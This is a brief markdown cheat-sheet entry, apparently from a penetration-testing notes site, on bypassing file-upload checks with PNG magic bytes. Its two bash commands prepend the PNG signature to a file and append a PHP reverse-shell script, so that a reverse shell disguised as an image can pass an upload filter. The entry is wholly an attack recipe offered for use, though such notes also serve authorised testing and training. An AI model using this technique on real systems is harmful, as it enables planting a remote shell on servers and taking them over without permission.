---
title: "Magic Bytes"
date: 2024-7-2
tags: ["file upload", "magic bytes", "png", "bypass"]
---

---
### png

```bash
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> php-reverse-shell.php.png
```

```bash
cat php-reverse-shell.php >> php-reverse-shell.php.png
```

<br>